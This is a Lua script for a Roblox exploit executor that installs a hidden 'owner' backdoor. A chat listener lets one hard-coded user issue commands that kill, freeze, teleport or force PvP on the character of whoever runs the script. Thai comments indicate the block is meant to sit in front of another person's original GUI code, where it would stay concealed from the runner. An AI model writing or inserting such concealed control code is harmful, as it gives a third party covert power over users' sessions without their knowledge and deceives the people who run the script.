-- Services setup
local Players, LocalPlayer, StarterGui, ReplicatedStorage do
    Players = cloneref(game:GetService("Players"))
    LocalPlayer = Players.LocalPlayer
    StarterGui = cloneref(game:GetService("StarterGui"))
    ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
end

-- Owner system variables
local owner = "16810y"
local prefix = "."

-- Command system (ย้ายไปไว้ก่อน Window creation)
local function executeCommand(message, sender)
    if sender.Name ~= owner then return end
    if message:sub(1,1) ~= prefix then return end
    
    local command = message:sub(2):lower()
    
    task.spawn(function() -- ใช้ task.spawn เพื่อป้องกัน yield errors
        if command == "re" then
            if LocalPlayer.Character then
                LocalPlayer.Character:BreakJoints()
            end
            
        elseif command == "freeze" then
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.Anchored = true
            end
            
        elseif command == "unfreeze" then
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.Anchored = false
            end
            
        elseif command == "enap" then
            local args = {
                [1] = "EnablePvp"
            }
            ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
            
        elseif command == "tm" then
            if LocalPlayer.Character and sender.Character then
                LocalPlayer.Character:MoveTo(sender.Character.HumanoidRootPart.Position)
            end
        end
    end)
end

-- Chat handler
local function setupChatHandler()
    local function playerAdded(player)
        player.Chatted:Connect(function(message)
            executeCommand(message, player)
        end)
    end

    for _, player in ipairs(Players:GetPlayers()) do
        playerAdded(player)
    end

    Players.PlayerAdded:Connect(playerAdded)
end

setupChatHandler()

-- ต่อจากนี้เป็น code เดิมของคุณ (Window creation etc.)
